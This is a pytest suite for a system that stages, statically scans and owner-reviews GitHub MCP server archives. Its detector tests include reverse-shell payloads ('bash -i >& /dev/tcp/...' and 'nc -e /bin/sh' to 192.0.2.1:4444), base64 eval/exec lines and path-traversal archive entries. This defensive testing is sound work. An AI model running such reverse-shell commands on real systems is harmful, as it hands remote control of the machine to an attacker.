"""E2E: bounded high-capacity inert GitHub MCP review with safe Owner visibility."""
from __future__ import annotations

import asyncio
import io
import json
import sqlite3
import stat
import zipfile
from types import SimpleNamespace

import httpx
import pytest
from fastapi.testclient import TestClient

from aura_core.evolution.external_staging import (
    CAPABILITY as STAGE_CAPABILITY, TOOL as STAGE_TOOL,
    EvolutionWorkspace, GitHubStagingMCPProvider, StagingRejected,
    _archive_budget, _archive_member_budget, _extracted_budget,
    _file_budget, _validated_files,
)
from aura_core.evolution.owner_control_plane_http import build_local_review_app
from aura_core.evolution.self_discovery import (
    CAPABILITY_ID, QUERIES, SelfDiscoveryEngine, _github_token,
)
from aura_core.kernel.permissions import AuthorizationDecision
from aura_core.mcp.dispatch_context import DispatchGrant, enter_dispatch, leave_dispatch


def _zip(files):
    stream = io.BytesIO()
    with zipfile.ZipFile(stream, "w", zipfile.ZIP_DEFLATED) as bundle:
        for name, content in files.items():
            bundle.writestr("project-root/" + name, content)
    return stream.getvalue()


def _legitimate_archive():
    files = {
        "README.md": b"Fully local offline MCP with no API key required",
        "pyproject.toml": b"[project]\nname = 'local-mcp'\n",
        "server.py": (b"import subprocess, httpx, sqlite3, pathlib, os\n"
                      b"from fastmcp import FastMCP\n"
                      b"app = FastMCP('review')\n"
                      b"def fetch(): return httpx.get('https://example.org')\n"
                      b"def env(): return os.getenv('CACHE_PATH')\n"
                      b"def runner(): return subprocess.run(['git','status'])\n"),
        "assets/icon.png": b"\x89PNG\x00opaque",
        "assets/state.sqlite": b"SQLite format 3\x00other",
        "assets/image.svg": b"<svg><rect width='1' height='1'/></svg>",
        "assets/file.pdf": b"%PDF-1.4\x00",
        "assets/unknown.dat": b"\xff\xfe\xfd",
        "tests/test_unsafe.py": b"eval(base64.b64decode('code'))",
        "docs/repeated.md": b"static API docs",
        ".github/workflows/build.yml": b"name: malicious-examples-ignored",
        "dist/app.min.js": b"eval(base64.b64decode('malicious-doc-example'))",
    }
    for n in range(2100):
        files[f"docs/page-{n:04d}.md"] = f"documentation {n}".encode()
    return _zip(files)


def test_high_capacity_defaults_and_invalid_overrides(monkeypatch, tmp_path):
    for name in (
        "AURA_EVOLUTION_MAX_DOWNLOAD_BYTES", "AURA_EVOLUTION_MAX_EXTRACTED_BYTES",
        "AURA_EVOLUTION_MAX_ARCHIVE_MEMBERS", "AURA_EVOLUTION_MAX_FILE_BYTES",
        "AURA_EVOLUTION_MAX_BYTES", "AURA_EVOLUTION_MAX_ITEMS",
    ):
        monkeypatch.delenv(name, raising=False)
    assert _archive_budget() == 268435456
    assert _extracted_budget() == 536870912
    assert _file_budget() == 33554432
    assert _archive_member_budget() == 25000
    workspace = EvolutionWorkspace(tmp_path / "outside")
    assert workspace.max_bytes == 5368709120
    assert workspace.max_items == 100
    monkeypatch.setenv("AURA_EVOLUTION_MAX_BYTES", "1073741824")
    monkeypatch.setenv("AURA_EVOLUTION_MAX_ITEMS", "60")
    assert EvolutionWorkspace(tmp_path / "other").max_bytes == 1073741824
    assert EvolutionWorkspace(tmp_path / "other").max_items == 60


@pytest.mark.parametrize("key,bad", [
    ("AURA_EVOLUTION_MAX_DOWNLOAD_BYTES", "-1"),
    ("AURA_EVOLUTION_MAX_EXTRACTED_BYTES", "999999999999999"),
    ("AURA_EVOLUTION_MAX_ARCHIVE_MEMBERS", "unbounded"),
    ("AURA_EVOLUTION_MAX_FILE_BYTES", "0"),
    ("AURA_EVOLUTION_MAX_BYTES", "0"),
    ("AURA_EVOLUTION_MAX_ITEMS", "1000000"),
])
def test_unsafe_override_fails_closed(monkeypatch, tmp_path, key, bad):
    monkeypatch.setenv(key, bad)
    with pytest.raises((StagingRejected, ValueError)):
        if key == "AURA_EVOLUTION_MAX_DOWNLOAD_BYTES":
            _archive_budget()
        elif key == "AURA_EVOLUTION_MAX_EXTRACTED_BYTES":
            _extracted_budget()
        elif key == "AURA_EVOLUTION_MAX_ARCHIVE_MEMBERS":
            _archive_member_budget()
        elif key == "AURA_EVOLUTION_MAX_FILE_BYTES":
            _file_budget()
        else:
            EvolutionWorkspace(tmp_path / "outside")


def test_large_zip_skips_docs_passive_binary_and_detects_capabilities():
    evidence = {}
    files, entrypoint, skipped = _validated_files(_legitimate_archive(), summary=evidence)
    assert entrypoint in ("pyproject.toml", "server.py")
    assert "server.py" in files
    assert "docs/repeated.md" not in files
    assert all(not k.startswith(("docs/", "assets/", "tests/", ".github/")) for k in files)
    assert skipped >= 4
    assert {"subprocess", "httpx", "sqlite3", "pathlib", "os.getenv"} <= set(evidence["detected_capabilities"])
    assert len(files) <= 3


@pytest.mark.parametrize("payload", [
    b"eval(base64.b64decode('ZGFuZ2Vy'))",
    b"exec(base64.b64decode(payload))",
    b"bash -i >& /dev/tcp/192.0.2.1/4444 0>&1",
    b"nc -e /bin/sh 192.0.2.1 4444",
])
def test_genuine_malicious_code_rejected(payload):
    archive = _zip({
        "README.md": b"Fully local offline MCP",
        "server.py": b"from fastmcp import FastMCP\n" + payload,
    })
    with pytest.raises(StagingRejected, match="unsafe|suspicious|risk"):
        _validated_files(archive)


@pytest.mark.parametrize("filename", [
    "../outside.py", "/root.py", "C:/root.py", "docs/../evil.py",
    "assets/evil.exe", "docs/malware.dll", "images/shim.wasm",
])
def test_all_entries_checked_even_when_ignored(filename):
    files = {
        "README.md": b"Fully local offline MCP", "server.py": b"from fastmcp import FastMCP",
        filename: b"x",
    }
    with pytest.raises(StagingRejected):
        _validated_files(_zip(files))


def test_symlink_under_skipped_docs_is_still_denied():
    stream = io.BytesIO()
    with zipfile.ZipFile(stream, "w") as z:
        z.writestr("root/README.md", "Fully local offline MCP")
        z.writestr("root/server.py", "from fastmcp import FastMCP")
        symlink = zipfile.ZipInfo("root/docs/shortcut.png")
        symlink.create_system = 3
        symlink.external_attr = (stat.S_IFLNK | 0o777) << 16
        z.writestr(symlink, "../../escape")
    with pytest.raises(StagingRejected, match="symlink|special"):
        _validated_files(stream.getvalue())


def test_e2e_2100_files_staging_verified_and_owner_catalog(tmp_path):
    repository = "example/local-fastmcp"
    sha = "c" * 40
    archive = _legitimate_archive()
    workspace = EvolutionWorkspace(tmp_path / "evolution")
    def handler(request):
        if request.url.path == "/repos/" + repository:
            return httpx.Response(200, json={
                "full_name": repository, "private": False, "archived": False,
                "fork": False, "license": {"spdx_id": "MIT"},
                "description": "Fully local offline FastMCP server",
            })
        if request.url.path == "/repos/" + repository + "/commits":
            return httpx.Response(200, json=[{"sha": sha}])
        if request.url.host == "codeload.github.com":
            return httpx.Response(200, content=archive)
        raise AssertionError(str(request.url))
    provider = GitHubStagingMCPProvider(workspace=workspace, transport=httpx.MockTransport(handler))
    requests = []
    class Gateway:
        async def invoke(self, request):
            requests.append(request)
            if request.capability_id == CAPABILITY_ID:
                return SimpleNamespace(decision=AuthorizationDecision.ALLOW, result={"items": []})
            assert request.capability_id == STAGE_CAPABILITY
            grant = enter_dispatch(DispatchGrant(
                principal_id="local_owner", capability_id=STAGE_CAPABILITY,
                tool_name=STAGE_TOOL, risk_level="medium", approval_consumed=False,
            ))
            try:
                proof = await provider.call_tool(STAGE_TOOL, request.arguments)
            finally:
                leave_dispatch(grant)
            return SimpleNamespace(decision=AuthorizationDecision.ALLOW, result=proof)
    engine = SelfDiscoveryEngine(
        gateway=Gateway(), db_path=workspace.root / "catalog" / "proposals.sqlite3",
        workspace=workspace, auto_stage=True,
    )
    with sqlite3.connect(engine._db_path) as db:
        db.execute(
            "INSERT INTO evolution_proposals "
            "(proposal_id,repository,url,description,license,capability_hint,created_at,stars,"
            "package_status,package_error,stage_attempts) VALUES (?,?,?,?,?,?,?,?,?,?,?)",
            ("sample", repository, "https://github.com/" + repository,
             "Fully local FastMCP", "MIT", "MCP", 1.0, 100,
             "STAGING_REJECTED", "ZIP file budget exceeded", 5),
        )
    report = asyncio.run(engine.run_once())
    assert report["staging_attempted"] == report["verified_count"] == 1
    assert report["activation_performed"] is False
    manifest_file = workspace.root / "verified" / "example__local-fastmcp" / "aura-capability-manifest.json"
    manifest = json.loads(manifest_file.read_text("utf-8"))
    assert manifest["status"] == "READY_FOR_OWNER_REVIEW"
    assert {"subprocess", "httpx", "sqlite3"} <= set(manifest["detected_capabilities"])
    assert (workspace.root / "staging" / "example__local-fastmcp" / "source" / "server.py").is_file()
    assert json.loads(workspace.active.read_text("utf-8"))["active"] == []
    with TestClient(build_local_review_app(workspace.root),
                    base_url="http://localhost:8766") as client:
        response = client.get("/api/owner/discoveries")
        assert response.status_code == 200
        item = next(i for i in response.json()["items"] if i["repository"] == repository)
        assert item["package_status"] == "READY_FOR_OWNER_REVIEW"
        assert item["static_verified"] is True
        assert "subprocess" in item["detected_capabilities"]
        assert "VERIFIED" in client.get("/app.js").text
        assert client.post(
            "/api/owner/challenge", json={"approval_id": "bad"},
            headers={"Origin": "http://localhost:8766"},
        ).status_code == 503


def test_discovery_queries_limit_monorepos_and_use_local_python_ts():
    assert len(QUERIES) == len(set(QUERIES))
    assert all("size:<25000" in query for query in QUERIES)
    assert any("fastmcp" in query.lower() for query in QUERIES)
    assert any("modelcontextprotocol" in query.lower() or "sdk" in query.lower()
               for query in QUERIES)


def test_gh_token_fallback(monkeypatch):
    monkeypatch.delenv("GITHUB_TOKEN", raising=False)
    monkeypatch.setenv("GH_TOKEN", "gh_example_token")
    assert _github_token() == "gh_example_token"


def test_legacy_static_false_positive_is_retried_once_without_activation(tmp_path):
    workspace = EvolutionWorkspace(tmp_path / "outside")
    calls = []

    class Gateway:
        async def invoke(self, request):
            if request.capability_id == CAPABILITY_ID:
                return SimpleNamespace(decision=AuthorizationDecision.ALLOW, result={"items": []})
            assert request.capability_id == STAGE_CAPABILITY
            calls.append(request)
            return SimpleNamespace(decision=AuthorizationDecision.ALLOW, result={
                "repository": request.arguments["repository"],
                "status": "READY_FOR_OWNER_REVIEW", "source_sha256": "a" * 64,
                "sandbox_attested": False, "activation_performed": False,
                "execution_allowed": False,
            })

    engine = SelfDiscoveryEngine(
        gateway=Gateway(), db_path=workspace.root / "catalog" / "proposals.sqlite3",
        workspace=workspace, auto_stage=True,
    )
    with sqlite3.connect(engine._db_path) as db:
        db.execute(
            "INSERT INTO evolution_proposals "
            "(proposal_id,repository,url,description,license,capability_hint,created_at,stars,"
            "package_status,package_error,stage_attempts) VALUES (?,?,?,?,?,?,?,?,?,?,?)",
            ("legacy", "local/fastmcp", "https://github.com/local/fastmcp",
             "Fully local offline", "MIT", "MCP", 1.0, 80,
             "STAGING_REJECTED", "Static risk/paid API signature detected", 6),
        )
    report = asyncio.run(engine.run_once())
    assert report["verified_count"] == 1
    assert report["activation_performed"] is False
    assert engine.proposals()[0]["package_status"] == "READY_FOR_OWNER_REVIEW"
    assert engine.proposals()[0]["stage_attempts"] == 7
    assert len(calls) == 1
    assert asyncio.run(engine.run_once())["staging_attempted"] == 0
    assert len(calls) == 1
    assert json.loads(workspace.active.read_text())["active"] == []
